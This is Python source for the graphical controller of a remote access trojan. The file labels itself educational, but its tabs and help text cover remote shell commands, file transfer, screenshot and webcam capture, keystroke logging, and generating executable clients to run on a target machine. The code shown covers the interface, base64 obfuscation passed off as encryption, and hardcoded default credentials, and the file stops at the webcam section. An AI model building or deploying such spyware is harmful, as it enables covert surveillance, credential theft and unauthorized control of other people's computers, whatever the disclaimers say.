#!/usr/bin/env python3
# ⚠️ Ce projet est à but pédagogique uniquement. Toute utilisation non autorisée est strictement interdite.
# Educational RAT GUI Server - For learning purposes only
# This program should only be used in controlled test environments

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import socket
import os
import sys
import base64
import threading
import platform
import time
import queue

# Try importing PIL or Pillow with multiple possible naming conventions
try:
    from PIL import Image, ImageTk
except ImportError:
    try:
        import Image, ImageTk
    except ImportError:
        print("ERROR: PIL/Pillow could not be imported despite being installed.")
        print("This might be a Python path issue. Please make sure PIL is installed with:")
        print("pip install pillow")
        PIL_AVAILABLE = False
    else:
        PIL_AVAILABLE = True
else:
    PIL_AVAILABLE = True

import shutil
import re
import subprocess
import ipaddress
import json
import logging

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("server_log.txt"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global variables for server operation
clients = {}
current_client = None
stop_flag = False
command_queue = queue.Queue()
response_queue = queue.Queue()
server_status = "idle"  # idle, listening, connected

# Authentication settings
AUTH_USERNAME = "admin"
AUTH_PASSWORD = "password"

class RATServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Educational RAT Server - 🛡 EDUCATIONAL USE ONLY")
        self.root.geometry("1000x700")
        self.root.minsize(800, 600)
        
        # Set application icon
        if platform.system() == "Windows":
            self.root.iconbitmap("icon.ico") if os.path.exists("icon.ico") else None
        
        # Set theme and colors
        self.bg_color = "#2E3440"  # Dark blue-gray
        self.text_color = "#ECEFF4"  # Off white
        self.accent_color = "#88C0D0"  # Light blue
        self.warning_color = "#EBCB8B"  # Yellow
        self.error_color = "#BF616A"  # Red
        self.success_color = "#A3BE8C"  # Green
        
        # Configure style
        self.style = ttk.Style()
        self.style.theme_use('clam')  # Use a modern theme as base
        
        # Configure colors for various widgets
        self.root.configure(bg=self.bg_color)
        self.style.configure("TFrame", background=self.bg_color)
        self.style.configure("TButton", 
                             background=self.accent_color, 
                             foreground=self.bg_color, 
                             font=("Segoe UI", 10, "bold"))
        self.style.configure("TLabel", 
                             background=self.bg_color, 
                             foreground=self.text_color, 
                             font=("Segoe UI", 10))
        self.style.configure("Bold.TLabel", 
                             background=self.bg_color, 
                             foreground=self.text_color, 
                             font=("Segoe UI", 12, "bold"))
        self.style.configure("Header.TLabel", 
                             background=self.bg_color, 
                             foreground=self.accent_color, 
                             font=("Segoe UI", 14, "bold"))
        self.style.configure("Status.TLabel", 
                             background=self.bg_color, 
                             foreground=self.success_color, 
                             font=("Segoe UI", 10))
        self.style.configure("Warning.TLabel", 
                             background=self.bg_color, 
                             foreground=self.warning_color, 
                             font=("Segoe UI", 12, "bold"))
        
        # Create ethical use warning banner at the top
        self.create_ethical_banner()
        
        # Setup tabs
        self.tab_control = ttk.Notebook(self.root)
        
        # Main control tab
        self.tab_control_frame = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_control_frame, text="Control Panel")
        
        # File operations tab
        self.tab_file_frame = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_file_frame, text="File Operations")
        
        # Screenshot tab
        self.tab_screenshot_frame = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_screenshot_frame, text="Screenshots")
        
        # System info tab
        self.tab_sysinfo_frame = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_sysinfo_frame, text="System Info")
        
        # Settings tab
        self.tab_settings_frame = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_settings_frame, text="Settings")
        
        # Webcam tab
        self.tab_webcam_frame = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_webcam_frame, text="Webcam")
        
        # Keylogger tab
        self.tab_keylogger_frame = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_keylogger_frame, text="Keylogger")
        
        # Help tab
        self.tab_help_frame = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_help_frame, text="Help")
        
        self.tab_control.pack(expand=1, fill="both", padx=10, pady=10)
        
        # Initialize server settings
        self.server_host = tk.StringVar(value="0.0.0.0")
        self.server_port = tk.IntVar(value=4444)
        self.server = None
        self.server_thread = None
        self.connection_monitor_thread = None
        self.is_port_open = False
        
        # Build client options
        self.build_exe_var = tk.BooleanVar(value=False)
        self.client_generated = False
        self.lan_mode_var = tk.BooleanVar(value=True)
        
        # Authentication options
        self.auth_username_var = tk.StringVar(value=AUTH_USERNAME)
        self.auth_password_var = tk.StringVar(value=AUTH_PASSWORD)
        
        # Initialize screenshot data
        self.screenshots = []
        self.current_screenshot_index = 0
        self.screenshot_image = None
        
        # Initialize webcam data
        self.webcam_images = []
        self.current_webcam_index = 0
        self.webcam_image = None
        
        # Set up the UI components
        self.setup_control_panel()
        self.setup_file_operations()
        self.setup_screenshot_panel()
        self.setup_sysinfo_panel()
        self.setup_settings_panel()
        self.setup_webcam_panel()
        self.setup_keylogger_panel()
        self.setup_help_panel()
        
        # Start response processing thread
        self.response_thread = threading.Thread(target=self.process_responses, daemon=True)
        self.response_thread.start()
        
        # Show welcome message
        self.log_message("Welcome to the Educational RAT Server GUI", "info")
        self.log_message("IMPORTANT: This tool is for educational purposes only", "warning")
        self.log_message("Use in authorized test environments only", "warning")
        
        # Setup window close handler
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def create_ethical_banner(self):
        """Create a visible ethical use warning banner"""
        banner_frame = ttk.Frame(self.root)
        banner_frame.pack(fill="x", padx=5, pady=5)
        
        warning_text = "🛡 EDUCATIONAL USE ONLY - UNAUTHORIZED USE IS ILLEGAL 🛡"
        warning_label = ttk.Label(banner_frame, text=warning_text, style="Warning.TLabel")
        warning_label.pack(fill="x", pady=5)
        
        separator = ttk.Separator(self.root, orient="horizontal")
        separator.pack(fill="x", padx=5, pady=5)
    
    def setup_control_panel(self):
        """Set up the main control panel tab"""
        control_frame = self.tab_control_frame
        
        # Split into left panel (clients) and right panel (command console)
        panel_frame = ttk.Frame(control_frame)
        panel_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Left panel - Client list
        left_frame = ttk.Frame(panel_frame, width=300)
        left_frame.pack(side=tk.LEFT, fill="both", padx=5, pady=5)
        
        # Client list header
        client_header = ttk.Label(left_frame, text="Connected Clients", style="Header.TLabel")
        client_header.pack(pady=(0, 10), anchor="w")
        
        # Client listbox with scrollbar
        client_frame = ttk.Frame(left_frame)
        client_frame.pack(fill="both", expand=True)
        
        self.client_listbox = tk.Listbox(client_frame, bg="#3B4252", fg=self.text_color,
                                         font=("Segoe UI", 10), selectbackground=self.accent_color)
        self.client_listbox.pack(side=tk.LEFT, fill="both", expand=True)
        
        client_scrollbar = ttk.Scrollbar(client_frame, orient="vertical", 
                                        command=self.client_listbox.yview)
        client_scrollbar.pack(side=tk.RIGHT, fill="y")
        self.client_listbox.config(yscrollcommand=client_scrollbar.set)
        
        # Client buttons
        client_button_frame = ttk.Frame(left_frame)
        client_button_frame.pack(fill="x", pady=10)
        
        self.refresh_btn = ttk.Button(client_button_frame, text="Refresh", 
                                     command=self.refresh_clients)
        self.refresh_btn.pack(side=tk.LEFT, padx=5)
        
        self.connect_btn = ttk.Button(client_button_frame, text="Connect", 
                                     command=self.connect_to_client)
        self.connect_btn.pack(side=tk.LEFT, padx=5)
        
        self.disconnect_btn = ttk.Button(client_button_frame, text="Disconnect", 
                                        command=self.disconnect_client)
        self.disconnect_btn.pack(side=tk.LEFT, padx=5)
        
        # Server control buttons
        server_button_frame = ttk.Frame(left_frame)
        server_button_frame.pack(fill="x", pady=10)
        
        self.start_server_btn = ttk.Button(server_button_frame, text="Start Server", 
                                         command=self.start_server)
        self.start_server_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_server_btn = ttk.Button(server_button_frame, text="Stop Server", 
                                        command=self.stop_server)
        self.stop_server_btn.pack(side=tk.LEFT, padx=5)
        self.stop_server_btn.config(state="disabled")
        
        # Connection status indicator (with color)
        status_frame = ttk.Frame(left_frame)
        status_frame.pack(fill="x", pady=10)
        
        self.status_var = tk.StringVar(value="Server: Stopped")
        self.status_label = ttk.Label(status_frame, textvariable=self.status_var, 
                                    style="Status.TLabel")
        self.status_label.pack(side=tk.LEFT, pady=5)
        
        # Add visual indicator for connection status
        self.status_indicator = tk.Canvas(status_frame, width=20, height=20, 
                                        bg=self.bg_color, highlightthickness=0)
        self.status_indicator.pack(side=tk.LEFT, padx=5)
        self.status_indicator.create_oval(2, 2, 18, 18, fill=self.error_color, tags="indicator")
        
        # Client count display
        self.client_count_var = tk.StringVar(value="Clients: 0")
        self.client_count_label = ttk.Label(status_frame, textvariable=self.client_count_var, 
                                         style="Status.TLabel")
        self.client_count_label.pack(side=tk.RIGHT, pady=5)
        
        # Right panel - Command console
        right_frame = ttk.Frame(panel_frame)
        right_frame.pack(side=tk.RIGHT, fill="both", expand=True, padx=5, pady=5)
        
        # Console header
        console_header = ttk.Label(right_frame, text="Command Console", style="Header.TLabel")
        console_header.pack(pady=(0, 10), anchor="w")
        
        # Console output
        self.console_output = scrolledtext.ScrolledText(right_frame, wrap=tk.WORD, 
                                                      bg="#3B4252", fg=self.text_color,
                                                      font=("Consolas", 10))
        self.console_output.pack(fill="both", expand=True, pady=5)
        self.console_output.config(state="disabled")
        
        # Command entry
        cmd_frame = ttk.Frame(right_frame)
        cmd_frame.pack(fill="x", pady=5)
        
        cmd_label = ttk.Label(cmd_frame, text="Command:", style="TLabel")
        cmd_label.pack(side=tk.LEFT, padx=(0, 5))
        
        self.cmd_entry = ttk.Entry(cmd_frame, font=("Segoe UI", 10), width=50)
        self.cmd_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=5)
        self.cmd_entry.bind("<Return>", self.send_command)
        
        self.send_btn = ttk.Button(cmd_frame, text="Send", command=self.send_command)
        self.send_btn.pack(side=tk.RIGHT, padx=5)

    def setup_file_operations(self):
        """Set up the file operations tab"""
        file_frame = self.tab_file_frame
        
        # Split into left and right panels
        panel_frame = ttk.Frame(file_frame)
        panel_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Left panel - Local files
        left_frame = ttk.Frame(panel_frame)
        left_frame.pack(side=tk.LEFT, fill="both", expand=True, padx=5, pady=5)
        
        # Local files header
        local_header = ttk.Label(left_frame, text="Local Files", style="Header.TLabel")
        local_header.pack(pady=(0, 10), anchor="w")
        
        # Local path and navigation
        local_path_frame = ttk.Frame(left_frame)
        local_path_frame.pack(fill="x", pady=5)
        
        self.local_path_var = tk.StringVar(value=os.getcwd())
        ttk.Label(local_path_frame, text="Path:", style="TLabel").pack(side=tk.LEFT)
        
        local_path_entry = ttk.Entry(local_path_frame, textvariable=self.local_path_var, width=40)
        local_path_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=5)
        
        browse_btn = ttk.Button(local_path_frame, text="Browse", command=self.browse_local_dir)
        browse_btn.pack(side=tk.RIGHT)
        
        # Local file listbox
        local_list_frame = ttk.Frame(left_frame)
        local_list_frame.pack(fill="both", expand=True, pady=5)
        
        self.local_file_listbox = tk.Listbox(local_list_frame, bg="#3B4252", fg=self.text_color,
                                           font=("Segoe UI", 10), selectbackground=self.accent_color)
        self.local_file_listbox.pack(side=tk.LEFT, fill="both", expand=True)
        
        local_scrollbar = ttk.Scrollbar(local_list_frame, orient="vertical", 
                                       command=self.local_file_listbox.yview)
        local_scrollbar.pack(side=tk.RIGHT, fill="y")
        self.local_file_listbox.config(yscrollcommand=local_scrollbar.set)
        
        # Refresh local files button
        refresh_local_btn = ttk.Button(left_frame, text="Refresh", command=self.refresh_local_files)
        refresh_local_btn.pack(anchor="w", pady=5)
        
        # Middle panel - Transfer buttons
        middle_frame = ttk.Frame(panel_frame, width=100)
        middle_frame.pack(side=tk.LEFT, fill="y", padx=10, pady=5)
        
        ttk.Label(middle_frame, text="Transfer", style="Bold.TLabel").pack(pady=10)
        
        upload_btn = ttk.Button(middle_frame, text="→ Upload →", 
                              command=self.upload_file)
        upload_btn.pack(pady=5)
        
        download_btn = ttk.Button(middle_frame, text="← Download ←", 
                                command=self.download_file)
        download_btn.pack(pady=5)
        
        # Right panel - Remote files
        right_frame = ttk.Frame(panel_frame)
        right_frame.pack(side=tk.RIGHT, fill="both", expand=True, padx=5, pady=5)
        
        # Remote files header
        remote_header = ttk.Label(right_frame, text="Remote Files", style="Header.TLabel")
        remote_header.pack(pady=(0, 10), anchor="w")
        
        # Remote path and navigation
        remote_path_frame = ttk.Frame(right_frame)
        remote_path_frame.pack(fill="x", pady=5)
        
        self.remote_path_var = tk.StringVar(value="")
        ttk.Label(remote_path_frame, text="Path:", style="TLabel").pack(side=tk.LEFT)
        
        remote_path_entry = ttk.Entry(remote_path_frame, textvariable=self.remote_path_var, width=40)
        remote_path_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=5)
        
        list_remote_btn = ttk.Button(remote_path_frame, text="List", command=self.list_remote_files)
        list_remote_btn.pack(side=tk.RIGHT)
        
        # Remote file listbox
        remote_list_frame = ttk.Frame(right_frame)
        remote_list_frame.pack(fill="both", expand=True, pady=5)
        
        self.remote_file_listbox = tk.Listbox(remote_list_frame, bg="#3B4252", fg=self.text_color,
                                            font=("Segoe UI", 10), selectbackground=self.accent_color)
        self.remote_file_listbox.pack(side=tk.LEFT, fill="both", expand=True)
        
        remote_scrollbar = ttk.Scrollbar(remote_list_frame, orient="vertical", 
                                        command=self.remote_file_listbox.yview)
        remote_scrollbar.pack(side=tk.RIGHT, fill="y")
        self.remote_file_listbox.config(yscrollcommand=remote_scrollbar.set)
        
        # Additional remote file operations
        remote_btn_frame = ttk.Frame(right_frame)
        remote_btn_frame.pack(fill="x", pady=5)
        
        refresh_remote_btn = ttk.Button(remote_btn_frame, text="Refresh", 
                                       command=self.list_remote_files)
        refresh_remote_btn.pack(side=tk.LEFT, padx=5)
        
        delete_remote_btn = ttk.Button(remote_btn_frame, text="Delete Selected", 
                                     command=self.delete_remote_file)
        delete_remote_btn.pack(side=tk.LEFT, padx=5)
        
        # Status message for file operations
        self.file_status_var = tk.StringVar(value="Ready for file operations")
        ttk.Label(file_frame, textvariable=self.file_status_var, 
                style="Status.TLabel").pack(pady=5, anchor="w")
        
        # Load initial local files
        self.refresh_local_files()

    def setup_screenshot_panel(self):
        """Set up the screenshot panel tab"""
        screenshot_frame = self.tab_screenshot_frame
        
        # Top controls
        control_frame = ttk.Frame(screenshot_frame)
        control_frame.pack(fill="x", padx=10, pady=10)
        
        capture_btn = ttk.Button(control_frame, text="Capture Screenshot", 
                               command=self.capture_screenshot)
        capture_btn.pack(side=tk.LEFT, padx=5)
        
        save_btn = ttk.Button(control_frame, text="Save Screenshot", 
                            command=self.save_screenshot)
        save_btn.pack(side=tk.LEFT, padx=5)
        
        # Screenshot display area
        display_frame = ttk.Frame(screenshot_frame)
        display_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Canvas for the screenshot
        self.screenshot_canvas = tk.Canvas(display_frame, bg="#2E3440", highlightthickness=0)
        self.screenshot_canvas.pack(fill="both", expand=True)
        
        # Navigation frame (bottom)
        nav_frame = ttk.Frame(screenshot_frame)
        nav_frame.pack(fill="x", padx=10, pady=10)
        
        prev_btn = ttk.Button(nav_frame, text="◀ Previous", command=self.prev_screenshot)
        prev_btn.pack(side=tk.LEFT, padx=5)
        
        self.screenshot_label = ttk.Label(nav_frame, text="No screenshots", style="TLabel")
        self.screenshot_label.pack(side=tk.LEFT, padx=20)
        
        next_btn = ttk.Button(nav_frame, text="Next ▶", command=self.next_screenshot)
        next_btn.pack(side=tk.LEFT, padx=5)
        
        # Status message
        self.screenshot_status_var = tk.StringVar(value="Ready to capture screenshots")
        ttk.Label(screenshot_frame, textvariable=self.screenshot_status_var, 
                style="Status.TLabel").pack(pady=5, anchor="w")

    def setup_sysinfo_panel(self):
        """Set up the system information panel tab"""
        sysinfo_frame = self.tab_sysinfo_frame
        
        # Top control buttons
        control_frame = ttk.Frame(sysinfo_frame)
        control_frame.pack(fill="x", padx=10, pady=10)
        
        refresh_btn = ttk.Button(control_frame, text="Refresh System Info", 
                               command=self.get_system_info)
        refresh_btn.pack(side=tk.LEFT, padx=5)
        
        export_btn = ttk.Button(control_frame, text="Export Info", 
                              command=self.export_system_info)
        export_btn.pack(side=tk.LEFT, padx=5)
        
        # System info display
        info_frame = ttk.Frame(sysinfo_frame)
        info_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Notebook for categorized system info
        self.sysinfo_notebook = ttk.Notebook(info_frame)
        
        # System tab
        self.system_tab = ttk.Frame(self.sysinfo_notebook)
        self.sysinfo_notebook.add(self.system_tab, text="System")
        
        # System info text widget
        self.system_info_text = scrolledtext.ScrolledText(self.system_tab, wrap=tk.WORD, 
                                                      bg="#3B4252", fg=self.text_color,
                                                      font=("Consolas", 10))
        self.system_info_text.pack(fill="both", expand=True)
        self.system_info_text.config(state="disabled")
        
        # Network tab
        self.network_tab = ttk.Frame(self.sysinfo_notebook)
        self.sysinfo_notebook.add(self.network_tab, text="Network")
        
        # Network info text widget
        self.network_info_text = scrolledtext.ScrolledText(self.network_tab, wrap=tk.WORD, 
                                                        bg="#3B4252", fg=self.text_color,
                                                        font=("Consolas", 10))
        self.network_info_text.pack(fill="both", expand=True)
        self.network_info_text.config(state="disabled")
        
        # Hardware tab
        self.hardware_tab = ttk.Frame(self.sysinfo_notebook)
        self.sysinfo_notebook.add(self.hardware_tab, text="Hardware")
        
        # Hardware info text widget
        self.hardware_info_text = scrolledtext.ScrolledText(self.hardware_tab, wrap=tk.WORD, 
                                                         bg="#3B4252", fg=self.text_color,
                                                         font=("Consolas", 10))
        self.hardware_info_text.pack(fill="both", expand=True)
        self.hardware_info_text.config(state="disabled")
        
        # Pack the notebook
        self.sysinfo_notebook.pack(fill="both", expand=True)
        
        # Status message
        self.sysinfo_status_var = tk.StringVar(value="Ready to fetch system information")
        ttk.Label(sysinfo_frame, textvariable=self.sysinfo_status_var, 
                style="Status.TLabel").pack(pady=5, anchor="w")

    def setup_settings_panel(self):
        """Set up the settings tab"""
        settings_frame = self.tab_settings_frame
        
        # Create frame for settings
        form_frame = ttk.Frame(settings_frame)
        form_frame.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Server settings
        server_settings = ttk.LabelFrame(form_frame, text="Server Settings")
        server_settings.pack(fill="x", pady=10, padx=10)
        
        # Host setting
        host_frame = ttk.Frame(server_settings)
        host_frame.pack(fill="x", pady=5, padx=10)
        
        host_label = ttk.Label(host_frame, text="Listening Host:", width=15)
        host_label.pack(side=tk.LEFT, padx=5)
        
        host_entry = ttk.Entry(host_frame, textvariable=self.server_host, width=20)
        host_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=5)
        
        # IP Info button
        ip_info_btn = ttk.Button(host_frame, text="Show IP Info", command=self.show_ip_info)
        ip_info_btn.pack(side=tk.RIGHT, padx=5)
        
        # Port setting
        port_frame = ttk.Frame(server_settings)
        port_frame.pack(fill="x", pady=5, padx=10)
        
        port_label = ttk.Label(port_frame, text="Listening Port:", width=15)
        port_label.pack(side=tk.LEFT, padx=5)
        
        port_entry = ttk.Entry(port_frame, textvariable=self.server_port, width=10)
        port_entry.pack(side=tk.LEFT, padx=5)
        
        # Port test button
        port_test_btn = ttk.Button(port_frame, text="Test Port", command=self.test_port)
        port_test_btn.pack(side=tk.RIGHT, padx=5)
        
        # Authentication settings
        auth_settings = ttk.LabelFrame(form_frame, text="Authentication Settings")
        auth_settings.pack(fill="x", pady=10, padx=10)
        
        # Username setting
        username_frame = ttk.Frame(auth_settings)
        username_frame.pack(fill="x", pady=5, padx=10)
        
        username_label = ttk.Label(username_frame, text="Username:", width=15)
        username_label.pack(side=tk.LEFT, padx=5)
        
        username_entry = ttk.Entry(username_frame, textvariable=self.auth_username_var, width=20)
        username_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=5)
        
        # Password setting
        password_frame = ttk.Frame(auth_settings)
        password_frame.pack(fill="x", pady=5, padx=10)
        
        password_label = ttk.Label(password_frame, text="Password:", width=15)
        password_label.pack(side=tk.LEFT, padx=5)
        
        password_entry = ttk.Entry(password_frame, textvariable=self.auth_password_var, width=20, show="*")
        password_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=5)
        
        # Client generation settings
        client_settings = ttk.LabelFrame(form_frame, text="Client Generation")
        client_settings.pack(fill="x", pady=10, padx=10)
        
        # Auto generate client
        auto_gen_frame = ttk.Frame(client_settings)
        auto_gen_frame.pack(fill="x", pady=5, padx=10)
        
        self.auto_generate_var = tk.BooleanVar(value=True)
        auto_gen_check = ttk.Checkbutton(auto_gen_frame, 
                                     text="Auto-generate client on server start",
                                     variable=self.auto_generate_var)
        auto_gen_check.pack(anchor="w")
        
        # LAN mode option
        lan_mode_frame = ttk.Frame(client_settings)
        lan_mode_frame.pack(fill="x", pady=5, padx=10)
        
        lan_mode_check = ttk.Checkbutton(lan_mode_frame, 
                                     text="Use LAN IP for client (for connections from other machines)",
                                     variable=self.lan_mode_var)
        lan_mode_check.pack(anchor="w")
        
        # Build exe option
        build_exe_frame = ttk.Frame(client_settings)
        build_exe_frame.pack(fill="x", pady=5, padx=10)
        
        build_exe_check = ttk.Checkbutton(build_exe_frame, 
                                      text="Build .exe file (requires PyInstaller)",
                                      variable=self.build_exe_var)
        build_exe_check.pack(anchor="w")
        
        # Save to builds folder option
        self.save_to_builds_var = tk.BooleanVar(value=True)
        save_builds_check = ttk.Checkbutton(build_exe_frame,
                                        text="Save builds to builds/clients/ folder",
                                        variable=self.save_to_builds_var)
        save_builds_check.pack(anchor="w")
        
        # Generate client button
        gen_client_btn = ttk.Button(client_settings, text="Generate Client Now", 
                                 command=self.manual_generate_client)
        gen_client_btn.pack(anchor="w", pady=5, padx=10)
        
        # Build exe button
        build_exe_btn = ttk.Button(client_settings, text="Build Executable Now", 
                                command=self.build_client_executable)
        build_exe_btn.pack(anchor="w", pady=5, padx=10)
        
        # Interface settings
        interface_settings = ttk.LabelFrame(form_frame, text="Interface Settings")
        interface_settings.pack(fill="x", pady=10, padx=10)
        
        # Auto-refresh setting
        refresh_frame = ttk.Frame(interface_settings)
        refresh_frame.pack(fill="x", pady=5, padx=10)
        
        self.auto_refresh_var = tk.BooleanVar(value=True)
        auto_refresh_check = ttk.Checkbutton(refresh_frame, text="Auto-refresh client list",
                                           variable=self.auto_refresh_var)
        auto_refresh_check.pack(anchor="w")
        
        # Log level setting
        log_frame = ttk.Frame(interface_settings)
        log_frame.pack(fill="x", pady=5, padx=10)
        
        log_label = ttk.Label(log_frame, text="Log Level:", width=15)
        log_label.pack(side=tk.LEFT, padx=5)
        
        self.log_level_var = tk.StringVar(value="Info")
        log_combo = ttk.Combobox(log_frame, textvariable=self.log_level_var, 
                               values=["Debug", "Info", "Warning", "Error"], 
                               state="readonly", width=15)
        log_combo.pack(side=tk.LEFT, padx=5)
        
        # Save settings button
        save_frame = ttk.Frame(form_frame)
        save_frame.pack(fill="x", pady=20, padx=10)
        
        save_btn = ttk.Button(save_frame, text="Save Settings", command=self.save_settings)
        save_btn.pack(side=tk.RIGHT, padx=5)
        
        # Reset button
        reset_btn = ttk.Button(save_frame, text="Reset to Defaults", command=self.reset_settings)
        reset_btn.pack(side=tk.RIGHT, padx=5)

    def setup_help_panel(self):
        """Set up the help tab"""
        help_frame = self.tab_help_frame
        
        # Help content
        help_text = """
Educational RAT Server GUI - Help Guide

⚠️ IMPORTANT: This tool is for educational purposes only and should only be used in authorized test environments.

### Getting Started
1. Configure server settings in the Settings tab
2. Start the server using the "Start Server" button in the Control Panel
3. Run the client on the target system (see client documentation)
4. Once connected, select a client from the list and start sending commands

### Tab Overview
- Control Panel: Manage connections and send commands
- File Operations: Upload and download files 
- Screenshots: Capture and view remote screenshots
- System Info: View detailed system information
- Webcam: Capture and view webcam images
- Keylogger: Monitor and record keystrokes
- Settings: Configure server and interface settings
- Help: View this help information

### Common Commands
- sysinfo: Get system information
- shell [command]: Execute a shell command
- download [file_path]: Download a file from client
- upload [file_path]: Upload a file to client
- screenshot: Capture client's screen
- webcam: Capture webcam image
- keylogger_start: Start the keylogger
- keylogger_stop: Stop the keylogger
- keylogger_dump: Get logged keystrokes

### Troubleshooting Connection Issues
- Check your firewall settings to ensure the server port is open
- Ensure the client is using the correct server IP (LAN IP for different machines)
- Test connectivity using the Test Port feature in Settings
- Use the client's built-in test_connection feature before connecting
- Look for detailed error messages in the client output

### Security Notice
Unauthorized access to computer systems is illegal in most jurisdictions.
Always obtain proper authorization before connecting to any system.
This tool is intended ONLY for educational purposes to understand security concepts.
"""
        
        # Create a text widget with the help content
        help_text_widget = scrolledtext.ScrolledText(help_frame, wrap=tk.WORD, 
                                                   bg="#3B4252", fg=self.text_color,
                                                   font=("Segoe UI", 10))
        help_text_widget.pack(fill="both", expand=True, padx=10, pady=10)
        help_text_widget.insert(tk.END, help_text)
        help_text_widget.config(state="disabled")
        
        # About section
        about_frame = ttk.Frame(help_frame)
        about_frame.pack(fill="x", padx=10, pady=10)
        
        about_label = ttk.Label(about_frame, 
                              text="Educational RAT GUI v1.1 - Created for cybersecurity education only",
                              style="Bold.TLabel")
        about_label.pack(side=tk.LEFT)

    def setup_webcam_panel(self):
        """Set up the webcam panel tab"""
        webcam_frame = self.tab_webcam_frame
        
        # Top controls
        control_frame = ttk.Frame(webcam_frame)
        control_frame.pack(fill="x", padx=10, pady=10)
        
        capture_btn = ttk.Button(control_frame, text="Capture Webcam", 
                               command=self.capture_webcam)
        capture_btn.pack(side=tk.LEFT, padx=5)
        
        save_btn = ttk.Button(control_frame, text="Save Image", 
                            command=self.save_webcam_image)
        save_btn.pack(side=tk.LEFT, padx=5)
        
        # Webcam display area
        display_frame = ttk.Frame(webcam_frame)
        display_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Canvas for the webcam image
        self.webcam_canvas = tk.Canvas(display_frame, bg="#2E3440", highlightthickness=0)
        self.webcam_canvas.pack(fill="both", expand=True)
        
        # Navigation frame (bottom)
        nav_frame = ttk.Frame(webcam_frame)
        nav_frame.pack(fill="x", padx=10, pady=10)
        
        prev_btn = ttk.Button(nav_frame, text="◀ Previous", command=self.prev_webcam_image)
        prev_btn.pack(side=tk.LEFT, padx=5)
        
        self.webcam_label = ttk.Label(nav_frame, text="No webcam images", style="TLabel")
        self.webcam_label.pack(side=tk.LEFT, padx=20)
        
        next_btn = ttk.Button(nav_frame, text="Next ▶", command=self.next_webcam_image)
        next_btn.pack(side=tk.LEFT, padx=5)
        
        # Status message
        self.webcam_status_var = tk.StringVar(value="Ready to capture webcam")
        ttk.Label(webcam_frame, textvariable=self.webcam_status_var, 
                style="Status.TLabel").pack(pady=5, anchor="w")
    
    def setup_keylogger_panel(self):
        """Set up the keylogger panel tab"""
        keylogger_frame = self.tab_keylogger_frame
        
        # Top controls
        control_frame = ttk.Frame(keylogger_frame)
        control_frame.pack(fill="x", padx=10, pady=10)
        
        start_btn = ttk.Button(control_frame, text="Start Keylogger", 
                             command=self.start_keylogger)
        start_btn.pack(side=tk.LEFT, padx=5)
        
        stop_btn = ttk.Button(control_frame, text="Stop Keylogger", 
                            command=self.stop_keylogger)
        stop_btn.pack(side=tk.LEFT, padx=5)
        
        dump_btn = ttk.Button(control_frame, text="Dump Keylog Data", 
                           command=self.dump_keylogger)
        dump_btn.pack(side=tk.LEFT, padx=5)
        
        save_btn = ttk.Button(control_frame, text="Save To File", 
                           command=self.save_keylogger_data)
        save_btn.pack(side=tk.LEFT, padx=5)
        
        # Keylogger data display
        display_frame = ttk.Frame(keylogger_frame)
        display_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Text widget for keylogger data
        self.keylogger_text = scrolledtext.ScrolledText(display_frame, wrap=tk.WORD, 
                                                    bg="#3B4252", fg=self.text_color,
                                                    font=("Consolas", 10))
        self.keylogger_text.pack(fill="both", expand=True)
        
        # Status message
        self.keylogger_status_var = tk.StringVar(value="Keylogger ready")
        ttk.Label(keylogger_frame, textvariable=self.keylogger_status_var, 
                style="Status.TLabel").pack(pady=5, anchor="w")
    
    # Helper functions for encryption/decryption
    def encrypt_data(self, data):
        """Simple encryption function (for educational purposes only)"""
        # Convert to bytes if it's a string
        if isinstance(data, str):
            data = data.encode()
        
        # Use base64 for basic obfuscation
        return base64.b64encode(data)
    
    def decrypt_data(self, data):
        """Simple decryption function (for educational purposes only)"""
        # Decrypt base64
        return base64.b64decode(data)
    
    def secure_send(self, sock, data):
        """Send encrypted data to the client"""
        try:
            if isinstance(data, str):
                data = data.encode()
            encrypted_data = self.encrypt_data(data)
            sock.send(encrypted_data)
            return True
        except Exception as e:
            logger.error(f"Error sending encrypted data: {e}")
            return False
    
    def secure_recv(self, sock, buffer_size=4096):
        """Receive and decrypt data from the client"""
        try:
            encrypted_data = sock.recv(buffer_size)
            if not encrypted_data:
                return None
            decrypted_data = self.decrypt_data(encrypted_data)
            return decrypted_data.decode()
        except Exception as e:
            logger.error(f"Error receiving encrypted data: {e}")
            return None
    
    def authenticate_client(self, client_socket):
        """Authenticate a client connection"""
        try:
            # Send authentication request
            self.secure_send(client_socket, "AUTH")
            
            # Receive credentials
            credentials_json = self.secure_recv(client_socket)
            if not credentials_json:
                return False
            
            try:
                credentials = json.loads(credentials_json)
                username = credentials.get("username")
                password = credentials.get("password")
                
                # Check credentials (in a real scenario, use secure storage)
                if username == self.auth_username_var.get() and password == self.auth_password_var.get():
                    self.secure_send(client_socket, "AUTH_SUCCESS")
                    return True
                else:
                    self.secure_send(client_socket, "AUTH_FAILED")
                    return False
            except:
                self.secure_send(client_socket, "AUTH_FAILED")
                return False
        except Exception as e:
            logger.error(f"Authentication error: {e}")
            return False
    
    # Webcam functions
